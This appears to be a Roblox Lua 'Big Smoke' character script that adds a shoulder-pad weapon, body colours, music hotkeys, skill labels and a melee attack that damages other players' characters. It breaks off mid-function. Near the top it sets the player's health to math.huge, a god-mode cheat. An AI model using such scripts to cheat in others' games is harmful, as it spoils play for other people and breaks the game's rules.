--U PICK DA WRUNG HAUSE F)00ll
paly = game.Players.LocalPlayer
Player = game:GetService("Players").LocalPlayer
p = game.Players.LocalPlayer
char = paly.Character
vt = Vector3.new
rarm = char["Right Arm"]
hed = char.Head
local randomquote = 0
larm = char["Left Arm"]
rleg = char["Right Leg"]
lleg = char["Left Leg"]
torso = char.Torso
local maincolor = BrickColor.random()
local sholpad = Instance.new("Part",char)
sholpad.Name = "SholPads"
sholpad.Reflectance = 0
sholpad.BottomSurface = 0
sholpad.TopSurface = 0
sholpad.Anchored = false
sholpad.Locked = true
sholpad.CanCollide = false
sholpad.BrickColor = BrickColor.new("White")
local padweld = Instance.new("Weld",sholpad)
padweld.Part0 = rarm
padweld.Part1 = sholpad
padweld.C0 = CFrame.new(0,-1.1,-.3)*CFrame.Angles(210,0,0)
local padmesh = Instance.new("SpecialMesh",sholpad)
padmesh.MeshType = "FileMesh"
padmesh.MeshId = "http://www.roblox.com/asset/?id=54983181"
padmesh.TextureId = "http://www.roblox.com/asset/?id=54983181"
padmesh.Scale = Vector3.new(1.2,1.2,1.2)
local asd = game:service'Players'.LocalPlayer
repeat wait() until asd.Character
local asdchar = asd.Character
local Torso = asdchar:findFirstChild("Torso")
local Head = asdchar:findFirstChild("Head")
local BC = asdchar["Body Colors"]
BC.HeadColor = BrickColor.new("Brown")
BC.LeftArmColor = BrickColor.new("Brown")
BC.LeftLegColor = BrickColor.new("Brown")
BC.RightArmColor = BrickColor.new("Brown")
BC.RightLegColor = BrickColor.new("Brown")
BC.TorsoColor = BrickColor.new("Brown")
keyboard = game:GetService("UserInputService")
mouse = asd:GetMouse()
cc = Instance.new("ColorCorrectionEffect",game.Lighting)
cc.TintColor = Color3.new(1,0,0)
cc.Saturation = -1
cc.Brightness = -.3
cc.Contrast = 1
cc.Enabled = false
local z = Instance.new("Sound", asdchar)
z.Name = "song"
z.SoundId = "rbxassetid://318250043" -- Put Music ID Here.
z.Volume = 1
z.EmitterSize = 1
z.MaxDistance = 1
local z2 = Instance.new("Sound", asdchar)
z2.Name = "song"
z2.SoundId = "rbxassetid://609079653" -- Put Music ID Here.
z2.Volume = 1
z2.EmitterSize = 1
z2.MaxDistance = 1
local fol = Instance.new("Sound", asdchar)
fol.Name = "song"
fol.SoundId = "rbxassetid://409176756" -- Put Music ID Here.
fol.Volume = 1
fol.EmitterSize = 1
fol.MaxDistance = 1
mouse.KeyDown:connect(function(key)
	if key == "z" then
		if z.IsPlaying == false then
			z:Play()
		elseif z.IsPlaying == true then
			z:Stop()
		end
		elseif key == "x" then
		if z2.IsPlaying == false then
			z2:Play()
		elseif z2.IsPlaying == true then
			z2:Stop()
			end
			elseif key == "c" then
		if fol.IsPlaying == false then
			fol:Play()
			cc.Enabled = true
			wait(2.011)
			cc.Enabled = false
		elseif fol.IsPlaying == true then
			fol:Stop()
			cc.Enabled = false
		end
		end
		end)
Player = game:GetService("Players").LocalPlayer
Character = Player.Character
Head = Character.Head
keyboard = game:GetService("UserInputService")
mouse = Player:GetMouse()
highnoon1 = true
highnoon2 = false
runservice = game:GetService("RunService")
bullets = 6
local Humanoid = Character:FindFirstChild("Humanoid")
Humanoid.Health = math.huge
wait()
Humanoid.MaxHealth = math.huge
la=Character["Left Arm"]
ra=Character["Right Arm"]
ll=Character["Left Leg"]
rl=Character["Right Leg"]
t=Character.Torso

local scrn = Instance.new("ScreenGui", asd.PlayerGui)
function makeframe(par, trans, pos, size, color)
  local frame = Instance.new("Frame", par)
  frame.BackgroundTransparency = trans
  frame.BorderSizePixel = 0
  frame.Position = pos
  frame.Size = size
  frame.BackgroundColor3 = Color3.new(.3,.3,.3)
  return frame
end
function makelabel(par, text)
  local label = Instance.new("TextLabel", par)
  label.BackgroundTransparency = 1
  label.Size = UDim2.new(1, 0, 1, 0)
  label.Position = UDim2.new(0, 0, 0, 0)
  label.TextColor3 = Color3.new(255, 255, 255)
  label.TextStrokeTransparency = 0
  label.FontSize = Enum.FontSize.Size32
  label.Font = Enum.Font.SourceSansLight
  label.BorderSizePixel = 0
  label.TextScaled = true
  label.Text = text
end
framesk1 = makeframe(scrn, 0.5, UDim2.new(0.8, 0, 0.85, 0), UDim2.new(0.16, 0, 0.1, 0), skillcolorscheme)
framesk2 = makeframe(scrn, 0.5, UDim2.new(0.8, 0, 0.74, 0), UDim2.new(0.16, 0, 0.1, 0), skillcolorscheme)
framesk3 = makeframe(scrn, 0.5, UDim2.new(0.8, 0, 0.63, 0), UDim2.new(0.16, 0, 0.1, 0), skillcolorscheme)
framesk4 = makeframe(scrn, 0.5, UDim2.new(0.8, 0, 0.52, 0), UDim2.new(0.16, 0, 0.1, 0), Color3.new(0,0,0))
bar1 = makeframe(framesk1, 0.5, UDim2.new(0, 0, 0, 0), UDim2.new(1, 0, 1, 0), skillcolorscheme)
bar2 = makeframe(framesk2, 0.5, UDim2.new(0, 0, 0, 0), UDim2.new(1, 0, 1, 0), skillcolorscheme)
bar3 = makeframe(framesk3, 0.5, UDim2.new(0, 0, 0, 0), UDim2.new(1, 0, 1, 0), skillcolorscheme)
bar4 = makeframe(framesk4, 0.5, UDim2.new(0, 0, 0, 0), UDim2.new(1, 0, 1, 0), Color3.new(0,0,0))
text1 = makelabel(framesk1, [[
[V]
 idk]])
text2 = makelabel(framesk2, [[
[C]
 YOU PICKED THE WRONG HOUSE FOOL!]])
text3 = makelabel(framesk3, [[
[X]
 OOOOOOOOOOOOOOOO]])
text4 = makelabel(framesk4, [[
[Z]
 BIG SMOKE ORDER]])

CV="Maroon"
local txt = Instance.new("BillboardGui", Character)
txt.Adornee = Character .Head
txt.Name = "_status"
txt.Size = UDim2.new(2, 0, 1.2, 0)
txt.StudsOffset = Vector3.new(-9, 8, 0)
local text = Instance.new("TextLabel", txt)
text.Size = UDim2.new(10, 0, 7, 0)
text.FontSize = "Size24"
text.TextScaled = true
text.TextTransparency = 0
text.BackgroundTransparency = 1 
text.TextTransparency = 0
text.TextStrokeTransparency = 0
text.Font = "Cartoon"
text.TextStrokeColor3 = Color3.new(0,0,0)
v=Instance.new("Part")
v.Name = "ColorBrick"
v.Parent=Player.Character
v.FormFactor="Symmetric"
v.Anchored=true
v.CanCollide=false
v.BottomSurface="Smooth"
v.TopSurface="Smooth"
v.Size=Vector3.new(10,5,3)
v.Transparency=1
v.CFrame=Character.Torso.CFrame
v.BrickColor=BrickColor.new(CV)
v.Transparency=1
text.TextColor3 = Color3.new(1,1,1)
v.Shape="Block"
text.Text = "BIG SMOKE"
local BC = Character["Body Colors"]
BC.HeadColor = BrickColor.new("Brown")
BC.LeftArmColor = BrickColor.new("Brown")
BC.LeftLegColor = BrickColor.new("Brown")
BC.RightArmColor = BrickColor.new("Brown")
BC.RightLegColor = BrickColor.new("Brown")
BC.TorsoColor = BrickColor.new("Brown")
Torso = Character.Torso
Head = Character.Head
for i,v in pairs(char:children()) do
    if v:IsA("Shirt") then
        v:Destroy()
    end
end
for i,v in pairs(char:children()) do
    if v:IsA("Pants") then
        v:Destroy()
    end
end
shirt = Instance.new("Shirt", char)
shirt.Name = "Shirt"
pants = Instance.new("Pants", char)
pants.Name = "Pants"
char.Shirt.ShirtTemplate = "http://www.roblox.com/asset/?id=593699904"
char.Pants.PantsTemplate = "http://www.roblox.com/asset/?id=129458425"
p = game.Players.LocalPlayer
char = p.Character
torso = char.Torso
neck = char.Torso.Neck
hum = char.Humanoid
hum.MaxHealth = 12500
wait()
hum.Health =hum.MaxHealth
euler = CFrame.fromEulerAnglesXYZ
angles = CFrame.Angles
local player = "LocalPlayer"
local Character = game.Players[player].Character
it = Instance.new
vt = Vector3.new
bc = BrickColor.new
cf = CFrame.new
mr = math.rad
local Weapon = {}
local p = game.Players.LocalPlayer
local char = p.Character
local mouse = p:GetMouse()
local larm = char["Left Arm"]
local rarm = char["Right Arm"]
local lleg = char["Left Leg"]
local rleg = char["Right Leg"]
local hed = char.Head
local torso = char.Torso
local hum = char.Humanoid
local cam = game.Workspace.CurrentCamera
local root = char.HumanoidRootPart
local deb = false
local shot = 0

local debris=game:service"Debris"
local l = game:GetService("Lighting")
local rs = game:GetService("RunService").RenderStepped
ptz = {0.8, 0.85, 0.9, 0.95, 1, 1.05, 1.1}
math.randomseed(os.time())
for i,v in pairs (hed:GetChildren()) do
        if v:IsA("Sound") then
                v:Destroy()
        end
end
weld = function(parent, part0, part1, c0)
  local weld = it("Motor6D")
  weld.Parent = parent
  weld.Part0 = part0
  weld.Part1 = part1
  weld.C0 = c0
  return weld
end
local modelzorzez = Instance.new("Model")
modelzorzez.Parent = workspace.CurrentCamera
modelzorzez.Name = "none"
local Torso = Character.Torso
local LeftArm = Character["Left Arm"]
local RightArm = Character["Right Arm"]
local LeftLeg = Character["Left Leg"]
local RightLeg = Character["Right Leg"]
local Head = Character.Head
local RootPart = Character.HumanoidRootPart
wait(0.016666666666667)
script.Archivable = false
Effects = {}
local Player = game.Players.localPlayer
local Character = Player.Character
local Humanoid = Character.Humanoid
local mouse = Player:GetMouse()
local m = Instance.new("Model", Character)
m.Name = "WeaponModel"
local effect = Instance.new("Model", Character)
effect.Name = "effecsfsafzx"
local demon = Instance.new("Model", Character)
demon.Name = "demdemd"
local LeftArm = Character["Left Arm"]
local RightArm = Character["Right Arm"]
local LeftLeg = Character["Left Leg"]
local RightLeg = Character["Right Leg"]
local do2target = nil
local Head = Character.Head
local Torso = Character.Torso
TorsoColor = BrickColor.new("Dark indigo")
local cam = game.Workspace.CurrentCamera
local RootPart = Character.HumanoidRootPart
local RootJoint = RootPart.RootJoint
local equipped = false
local attack = false
local Anim = "Idle"
local idle = 0
local attacktype = 1
local Torsovelocity = RootPart.Velocity * Vector3.new(1, 0, 1).magnitude
local velocity = RootPart.Velocity.y
local sine = 0
local change = 1
local mana = 0
local it = Instance.new
vt = Vector3.new
local grabbed = false
local cf = CFrame.new
local mr = math.rad
local angles = CFrame.Angles
local ud = UDim2.new
local c3 = Color3.new

Damagefunc=function(hit,minim,maxim,knockback,Type,Property,Delay,KnockbackType,decreaseblock)
        if hit.Parent==nil then
                return
        end
        h=hit.Parent:FindFirstChild("Humanoid")
        for _,v in pairs(hit.Parent:children()) do
        if v:IsA("Humanoid") then
        h=v
        end
        end
        if hit.Parent.Parent:FindFirstChild("Torso")~=nil then
        h=hit.Parent.Parent:FindFirstChild("Humanoid")
        end
        if hit.Parent.className=="Hat" then
        hit=hit.Parent.Parent:findFirstChild("Head")
        end
        if h~=nil and hit.Parent.Name~=Character.Name and hit.Parent:FindFirstChild("Torso")~=nil then
        if hit.Parent:findFirstChild("DebounceHit")~=nil then if hit.Parent.DebounceHit.Value==true then return end end
        --[[                if game.Players:GetPlayerFromCharacter(hit.Parent)~=nil then
                        return
                end]]
--                        hs(hit,1.2) 
                        c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=game:service("Players").LocalPlayer
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
                Damage=math.random(minim,maxim)
--                h:TakeDamage(Damage)
                blocked=false
                block=hit.Parent:findFirstChild("Block")
                if block~=nil then
                print(block.className)
                if block.className=="NumberValue" then
                if block.Value>0 then
                blocked=true
                if decreaseblock==nil then
                block.Value=block.Value-1
                end
                end
                end
                if block.className=="IntValue" then
                if block.Value>0 then
                blocked=true
                if decreaseblock~=nil then
                block.Value=block.Value-1
                end
                end
                end
                end
                if blocked==false then
--                h:TakeDamage(Damage)
                h.Health=h.Health-Damage
                showDamage(hit.Parent,Damage,.5,TorsoColor)
                else
                h.Health=h.Health-(Damage/2)
                showDamage(hit.Parent,Damage/2,.5,BrickColor.new("Bright blue"))
                end
                if Type=="Knockdown" then
                hum=hit.Parent.Humanoid
hum.PlatformStand=true
coroutine.resume(coroutine.create(function(HHumanoid)
swait(1)
HHumanoid.PlatformStand=false
end),hum)
                local angle=(hit.Position-(Property.Position+Vector3.new(0,0,0))).unit
--hit.CFrame=CFrame.new(hit.Position,Vector3.new(angle.x,hit.Position.y,angle.z))*CFrame.fromEulerAnglesXYZ(math.pi/4,0,0)
local bodvol=Instance.new("BodyVelocity")
bodvol.velocity=angle*knockback
bodvol.P=5000
bodvol.maxForce=Vector3.new(8e+003, 8e+003, 8e+003)
bodvol.Parent=hit
rl=Instance.new("BodyAngularVelocity")
rl.P=3000
rl.maxTorque=Vector3.new(500000,500000,500000)*50000000000000
rl.angularvelocity=Vector3.new(math.random(-10,10),math.random(-10,10),math.random(-10,10))
rl.Parent=hit
game:GetService("Debris"):AddItem(bodvol,.5)
game:GetService("Debris"):AddItem(rl,.5)
                elseif Type=="Normal" then
                vp=Instance.new("BodyVelocity")
                vp.P=500
                vp.maxForce=Vector3.new(math.huge,0,math.huge)
--                vp.velocity=Character.Torso.CFrame.lookVector*Knockback
                if KnockbackType==1 then
                vp.velocity=Property.CFrame.lookVector*knockback+Property.Velocity/1.05
                elseif KnockbackType==2 then
                vp.velocity=Property.CFrame.lookVector*knockback
                end
                if knockback>0 then
                        vp.Parent=hit.Parent.Torso
                end
                game:GetService("Debris"):AddItem(vp,.5)
                elseif Type=="Up" then
                local bodyVelocity=Instance.new("BodyVelocity")
                bodyVelocity.velocity=vt(0,10,0)
                bodyVelocity.P=1000
                bodyVelocity.maxForce=Vector3.new(1e+009, 1e+009, 1e+009)
                bodyVelocity.Parent=hit
                game:GetService("Debris"):AddItem(bodyVelocity,1)
                rl=Instance.new("BodyAngularVelocity")
                rl.P=3000
                rl.maxTorque=Vector3.new(500000,500000,500000)*50000000000000
                rl.angularvelocity=Vector3.new(math.random(-20,20),math.random(-20,20),math.random(-20,20))
                rl.Parent=hit
                game:GetService("Debris"):AddItem(rl,.5)
                elseif Type=="Snare" then
                bp=Instance.new("BodyPosition")
                bp.P=2000
                bp.D=100
                bp.maxForce=Vector3.new(math.huge,math.huge,math.huge)
                bp.position=hit.Parent.Torso.Position
                bp.Parent=hit.Parent.Torso
                game:GetService("Debris"):AddItem(bp,1)
                elseif Type=="Target" then
                if Targetting==false then
                ZTarget=hit.Parent.Torso
                coroutine.resume(coroutine.create(function(Part) 
                swait(5)
                end),ZTarget)
                TargHum=ZTarget.Parent:findFirstChild("Humanoid")
                targetgui=Instance.new("BillboardGui")
                targetgui.Parent=ZTarget
                targetgui.Size=UDim2.new(10,100,10,100)
                targ=Instance.new("ImageLabel")
                targ.Parent=targetgui
                targ.BackgroundTransparency=1
                targ.Image="rbxassetid://4834067"
                targ.Size=UDim2.new(1,0,1,0)
                cam.CameraType="Scriptable"
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                dir=Vector3.new(cam.CoordinateFrame.lookVector.x,0,cam.CoordinateFrame.lookVector.z)
                workspace.CurrentCamera.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                Targetting=true
                RocketTarget=ZTarget
                for i=1,Property do
                --while Targetting==true and Humanoid.Health>0 and Character.Parent~=nil do
                if Humanoid.Health>0 and Character.Parent~=nil and TargHum.Health>0 and TargHum.Parent~=nil and Targetting==true then
                swait()
                end
                --workspace.CurrentCamera.CoordinateFrame=CFrame.new(Head.CFrame.p,Head.CFrame.p+rmdir*100)
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)
                dir=Vector3.new(cam.CoordinateFrame.lookVector.x,0,cam.CoordinateFrame.lookVector.z)
                cam.CoordinateFrame=CFrame.new(Head.CFrame.p,ZTarget.Position)*cf(0,5,10)*euler(-0.3,0,0)
                end
                Targetting=false
                RocketTarget=nil
                targetgui.Parent=nil
                cam.CameraType="Custom"
                end
                end
                        debounce=Instance.new("BoolValue")
                        debounce.Name="DebounceHit"
                        debounce.Parent=hit.Parent
                        debounce.Value=true
                        game:GetService("Debris"):AddItem(debounce,Delay)
                        c=Instance.new("ObjectValue")
                        c.Name="creator"
                        c.Value=Player
                        c.Parent=h
                        game:GetService("Debris"):AddItem(c,.5)
                CRIT=false
                hitDeb=true
                AttackPos=6
        end
end
 
showDamage=function(Char,Dealt,du,Color)
        m=Instance.new("Model")
        m.Name=""
        h=Instance.new("Humanoid")
        h.Health=0
        h.MaxHealth=0
        h.Parent=m
        c=Instance.new("Part")
        c.Transparency=0
        c.Material = "Neon"
        c.BrickColor=bc("Bright red")
        c.Name="Head"
        c.TopSurface=0
        c.BottomSurface=0
CV="Hot pink"

local txt = Instance.new("BillboardGui", c)
txt.Adornee = c
txt.Name = "_status"
txt.Size = UDim2.new(2, 0, 1.2, 0)
txt.StudsOffset = Vector3.new(-9, 8, 0)
local text = Instance.new("TextLabel", txt)
text.Size = UDim2.new(10, 0, 7, 0)
text.FontSize = "Size24"
text.TextScaled = true
text.TextTransparency = 0
text.BackgroundTransparency = 1 
text.TextTransparency = 0
text.TextStrokeTransparency = 0
text.Font = "Cartoon"
text.TextStrokeColor3 = BrickColor.new("Really black").Color

v=Instance.new("Part")
v.Name = "ColorBrick"
v.Parent=c
v.FormFactor="Symmetric"
v.Anchored=true
v.CanCollide=false
v.BottomSurface="Smooth"
v.TopSurface="Smooth"
v.Size=Vector3.new(10,5,3)
v.Transparency=1
v.CFrame=c.CFrame
v.BrickColor=BrickColor.new(CV)
v.Transparency=1
text.TextColor3 = BrickColor.new("White").Color
v.Shape="Block"
text.Text = tostring(Dealt).. "!"
  local tick = Instance.new("Sound",c)
  tick.SoundId = "rbxassetid://553325070"
  tick.Volume = 1.25
  tick.Pitch = 0.75
  tick:Play()
        c.formFactor="Plate"
c.Transparency = 0.99
        c.Size=Vector3.new(1,.4,1)
        ms=Instance.new("CylinderMesh")
        ms.Scale=Vector3.new(.8,.8,.8)
        if CRIT==true then
                ms.Scale=Vector3.new(1,1.25,1)
        end
        ms.Parent=c
        c.Reflectance=0
        Instance.new("BodyGyro").Parent=c
        c.Parent=m
        if Char:findFirstChild("Head")~=nil then
        c.CFrame=CFrame.new(Char["Head"].CFrame.p+Vector3.new(0,1.5,0))
        elseif Char.Parent:findFirstChild("Head")~=nil then
        c.CFrame=CFrame.new(Char.Parent["Head"].CFrame.p+Vector3.new(0,1.5,0))
        end
        f=Instance.new("BodyPosition")
        f.P=2000
        f.D=100
        f.maxForce=Vector3.new(math.huge,math.huge,math.huge)
        f.position=c.Position+Vector3.new(0,3,0)
        f.Parent=c
        game:GetService("Debris"):AddItem(m,.5+du)
        c.CanCollide=false
        m.Parent=workspace
        c.CanCollide=false
end

clerp = function(a, b, t)
  
  return a:lerp(b, t)
end

ArtificialHB = Instance.new("BindableEvent", script)
ArtificialHB.Name = "Heartbeat"
script:WaitForChild("Heartbeat")
frame = 0.033333333333333
tf = 0
allowframeloss = false
tossremainder = false
lastframe = tick()
script.Heartbeat:Fire()
game:GetService("RunService").Heartbeat:connect(function(s, p)
  
  tf = tf + s
  if frame <= tf then
    if allowframeloss then
      script.Heartbeat:Fire()
      lastframe = tick()
    else
      for i = 1, math.floor(tf / frame) do
        script.Heartbeat:Fire()
      end
      lastframe = tick()
    end
    if tossremainder then
      tf = 0
    else
      tf = tf - frame * math.floor(tf / frame)
    end
  end
end
)
swait = function(num)
  
  if num == 0 or num == nil then
    ArtificialHB.Event:wait()
  else
    for i = 0, num do
      ArtificialHB.Event:wait()
    end
  end
end

CreateSound = function(id, par, vol, pit)
  
  coroutine.resume(coroutine.create(function()
    
    local sou = Instance.new("Sound", par or workspace)
    sou.Volume = vol
    sou.Pitch = pit or 1
    sou.SoundId = id
    swait()
    sou:play()
    game:GetService("Debris"):AddItem(sou, 6)
  end
))
end
paly = game.Players.LocalPlayer
char = paly.Character
torso = char.Torso
neck = char.Torso.Neck
hum = char.Humanoid
Player = game:GetService("Players").LocalPlayer
local mouse = Player:GetMouse()
Character = Player.Character
tors = Character.Torso
lleg = Character["Left Leg"]
root = Character.HumanoidRootPart
hed = Character.Head
rleg = Character["Right Leg"]
rarm = Character["Right Arm"]
larm = Character["Left Arm"]
local Effects = {}
attack = false
vt = Vector3.new
bc = BrickColor.new
br = BrickColor.random
it = Instance.new
cf = CFrame.new
euler = CFrame.fromEulerAnglesXYZ
angles = CFrame.Angles
matr = math.random
-- sin
Player=game:GetService("Players").LocalPlayer
Character=Player.Character 
PlayerGui=Player.PlayerGui 
Backpack=Player.Backpack 
Torso=Character.Torso 
Head=Character.Head 
Humanoid=Character.Humanoid
m=Instance.new('Model',Character)
LeftArm=Character["Left Arm"] 
LeftLeg=Character["Left Leg"] 
RightArm=Character["Right Arm"] 
RightLeg=Character["Right Leg"] 
LS=Torso["Left Shoulder"] 
LH=Torso["Left Hip"] 
RS=Torso["Right Shoulder"] 
RH=Torso["Right Hip"] 
Face = Head.face
Neck=Torso.Neck
it=Instance.new
attacktype=1
vt=Vector3.new
cf=CFrame.new
euler=CFrame.fromEulerAnglesXYZ
angles=CFrame.Angles
cloaked=false
necko=cf(0, 1, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
necko2=cf(0, -0.5, 0, -1, -0, -0, 0, 0, 1, 0, 1, 0)
LHC0=cf(-1,-1,0,-0,-0,-1,0,1,0,1,0,0)
LHC1=cf(-0.5,1,0,-0,-0,-1,0,1,0,1,0,0)
RHC0=cf(1,-1,0,0,0,1,0,1,0,-1,-0,-0)
RHC1=cf(0.5,1,0,0,0,1,0,1,0,-1,-0,-0)
RootPart=Character.HumanoidRootPart
RootJoint=RootPart.RootJoint
RootCF=euler(-1.57,0,3.14)
attack = false 
attackdebounce = false 
deb=false
equipped=true
hand=false
MMouse=nil
combo=0
mana=0
trispeed=1
pathtrans=.7
attackmode='none'
local idle=0
local Anim="Idle"
local Effects={}
local gun=false
local shoot=false
player=nil 
cloak=false
lightcolor='Bright blue'

mouse=Player:GetMouse()
--save shoulders 
RSH, LSH=nil, nil 
--welds 
RW, LW=Instance.new("Weld"), Instance.new("Weld") 
RW.Name="Right Shoulder" LW.Name="Left Shoulder"
LH=Torso["Left Hip"]
RH=Torso["Right Hip"]
TorsoColor=BrickColor.new("Dark indigo")
function NoOutline(Part)
Part.TopSurface,Part.BottomSurface,Part.LeftSurface,Part.RightSurface,Part.FrontSurface,Part.BackSurface = 10,10,10,10,10,10
end
player=Player 
ch=Character
RSH=ch.Torso["Right Shoulder"] 
LSH=ch.Torso["Left Shoulder"] 
-- 
RSH.Parent=nil 
LSH.Parent=nil 
-- 
RW.Name="Right Shoulder"
RW.Part0=ch.Torso 
RW.C0=cf(1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.3, 0, -0.5) 
RW.C1=cf(0, 0.5, 0) 
RW.Part1=ch["Right Arm"] 
RW.Parent=ch.Torso 
-- 
LW.Name="Left Shoulder"
LW.Part0=ch.Torso 
LW.C0=cf(-1.5, 0.5, 0) --* CFrame.fromEulerAnglesXYZ(1.7, 0, 0.8) 
LW.C1=cf(0, 0.5, 0) 
LW.Part1=ch["Left Arm"] 
LW.Parent=ch.Torso 


function part(formfactor,parent,reflectance,transparency,brickcolor,name,size)
local fp=it("Part")
fp.formFactor=formfactor 
fp.Parent=parent
fp.Reflectance=reflectance
fp.Transparency=transparency
fp.CanCollide=false 
fp.Locked=true
fp.BrickColor=brickcolor
fp.Name=name
fp.Size=size
fp.Position=Torso.Position 
NoOutline(fp)
fp.Material="Neon"
fp:BreakJoints()
return fp 
end 

 
local Color1=BrickColor.new("Dark indigo")

local bodvel=Instance.new("BodyVelocity")
local bg=Instance.new("BodyGyro")

function swait(num)
if num==0 or num==nil then
game:service'RunService'.Stepped:wait(0)
else
for i=0,num do
game:service'RunService'.Stepped:wait(0)
end
end
end
 
 
so = function(id,par,vol,pit) 
coroutine.resume(coroutine.create(function()
local sou = Instance.new("Sound",par or workspace)
sou.Volume=vol
sou.Pitch=pit or 1
sou.SoundId=id
swait() 
sou:play() 
game:GetService("Debris"):AddItem(sou,6)
end))
end
 
function clerp(a,b,t) 
local qa = {QuaternionFromCFrame(a)}
local qb = {QuaternionFromCFrame(b)} 
local ax, ay, az = a.x, a.y, a.z 
local bx, by, bz = b.x, b.y, b.z
local _t = 1-t
return QuaternionToCFrame(_t*ax + t*bx, _t*ay + t*by, _t*az + t*bz,QuaternionSlerp(qa, qb, t)) 
end 
 
function QuaternionFromCFrame(cf) 
local mx, my, mz, m00, m01, m02, m10, m11, m12, m20, m21, m22 = cf:components() 
local trace = m00 + m11 + m22 
if trace > 0 then 
local s = math.sqrt(1 + trace) 
local recip = 0.5/s 
return (m21-m12)*recip, (m02-m20)*recip, (m10-m01)*recip, s*0.5 
else 
local i = 0 
if m11 > m00 then
i = 1
end
if m22 > (i == 0 and m00 or m11) then 
i = 2 
end 
if i == 0 then 
local s = math.sqrt(m00-m11-m22+1) 
local recip = 0.5/s 
return 0.5*s, (m10+m01)*recip, (m20+m02)*recip, (m21-m12)*recip 
elseif i == 1 then 
local s = math.sqrt(m11-m22-m00+1) 
local recip = 0.5/s 
return (m01+m10)*recip, 0.5*s, (m21+m12)*recip, (m02-m20)*recip 
elseif i == 2 then 
local s = math.sqrt(m22-m00-m11+1) 
local recip = 0.5/s return (m02+m20)*recip, (m12+m21)*recip, 0.5*s, (m10-m01)*recip 
end 
end 
end
 
function QuaternionToCFrame(px, py, pz, x, y, z, w) 
local xs, ys, zs = x + x, y + y, z + z 
local wx, wy, wz = w*xs, w*ys, w*zs 
local xx = x*xs 
local xy = x*ys 
local xz = x*zs 
local yy = y*ys 
local yz = y*zs 
local zz = z*zs 
return CFrame.new(px, py, pz,1-(yy+zz), xy - wz, xz + wy,xy + wz, 1-(xx+zz), yz - wx, xz - wy, yz + wx, 1-(xx+yy)) 
end
 
function QuaternionSlerp(a, b, t) 
local cosTheta = a[1]*b[1] + a[2]*b[2] + a[3]*b[3] + a[4]*b[4] 
local startInterp, finishInterp; 
if cosTheta >= 0.0001 then 
if (1 - cosTheta) > 0.0001 then 
local theta = math.acos(cosTheta) 
local invSinTheta = 1/math.sin(theta) 
startInterp = math.sin((1-t)*theta)*invSinTheta 
finishInterp = math.sin(t*theta)*invSinTheta  
else 
startInterp = 1-t 
finishInterp = t 
end 
else 
if (1+cosTheta) > 0.0001 then 
local theta = math.acos(-cosTheta) 
local invSinTheta = 1/math.sin(theta) 
startInterp = math.sin((t-1)*theta)*invSinTheta 
finishInterp = math.sin(t*theta)*invSinTheta 
else 
startInterp = t-1 
finishInterp = t 
end 
end 
return a[1]*startInterp + b[1]*finishInterp, a[2]*startInterp + b[2]*finishInterp, a[3]*startInterp + b[3]*finishInterp, a[4]*startInterp + b[4]*finishInterp 
end

function rayCast(Pos, Dir, Max, Ignore)  -- Origin Position , Direction, MaxDistance , IgnoreDescendants
return game:service("Workspace"):FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore) 
end 

function SkullEffect(brickcolor,cframe,x1,y1,z1,delay)
local prt=part(3,workspace,0,0,brickcolor,"Effect",vt(0.5,0.5,0.5))
prt.Anchored=true
prt.CFrame=cframe
local msh=mesh("SpecialMesh",prt,"FileMesh","http://www.roblox.com/asset/?id=4770583",vt(0,0,0),vt(x1,y1,z1))
--http://www.roblox.com/asset/?id=4770560
game:GetService("Debris"):AddItem(prt,2)
CF=prt.CFrame
coroutine.resume(coroutine.create(function(Part,Mesh,TehCF) 
for i=0,1,0.2 do
wait()
Part.CFrame=CF*cf(0,0,-0.4)
end
for i=0,1,delay do
wait()
--Part.CFrame=CF*cf((math.random(-1,0)+math.random())/5,(math.random(-1,0)+math.random())/5,(math.random(-1,0)+math.random())/5)
Mesh.Scale=Mesh.Scale
end
for i=0,1,0.1 do
wait()
Part.Transparency=i
end
Part.Parent=nil
end),prt,msh,CF)
end

Humanoid.Animator:Destroy()
Character.Animate:Destroy()

local Footsteps = it("Sound",Character.Torso)
Footsteps.SoundId = "rbxassetid://142665235"
Footsteps.Looped = true
Footsteps.Pitch = 0.8
Footsteps.Volume = 0.3

local Footsteps2 = it("Sound",Character.Torso)
Footsteps2.SoundId = "rbxassetid://142665235"
Footsteps2.Looped = true
Footsteps2.Pitch = 1
Footsteps2.Volume = 0.4

local cam = game.Workspace.CurrentCamera

--cam.CameraSubject = Character

for i,v in pairs(Head:children()) do
    if v:IsA("Sound") then
        v:Destroy()
    end
end

function BASEBALLBAT()
    attack=true
						
coroutine.wrap(function()
for i = 1,10 do
wait()
end end)()
    con1=sholpad.Touched:connect(function(hit) Damagefunc(hit,10,20,math.random(20,40),"Normal",RootPart,.2,1) end) 
    for i=0,1,0.08 do
        swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(-5),math.rad(0),math.rad(-20)),.3)
        Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(0),math.rad(0),math.rad(20)),.3)
        RW.C0=clerp(RW.C0,cf(1.5,0.5,-0.5)*angles(math.rad(75),math.rad(0),math.rad(15)),.5)
        LW.C0=clerp(RW.C0,cf(-1.5,0.5,-1.5)*angles(math.rad(75),math.rad(0),math.rad(-230)),.5)
    end
    so("rbxassetid://280667448",sholpad,10,0.75) 
    for i=0,1,0.1 do
        swait()
		RootJoint.C0=clerp(RootJoint.C0,RootCF*cf(0,0,0)*angles(math.rad(10),math.rad(0),math.rad(-20)),.3)
        Torso.Neck.C0=clerp(Torso.Neck.C0,necko*angles(math.rad(0),math.rad(0),math.rad(20)),.3)
        RW.C0=clerp(RW.C0,cf(0.5,0.5,-0.5)*angles(math.rad(75),math.rad(0),math.rad(-50)),.5)
        LW.C0=clerp(RW.C0,cf(-3.5,0.5,-1)*angles(math.rad(75),math.rad(0),math.rad(-250)),.5)
    end
    --dmgstop()
    attack=false
    con1:disconnect()
end

mouse.Button1Down:connect(function()
	if attack==false then
BASEBALLBAT()
end
end)

mouse.KeyDown:connect(function(k)
	k=k:lower()
	if k=='e' then
		if attack==false and mana>=20 then
			Push()
		end
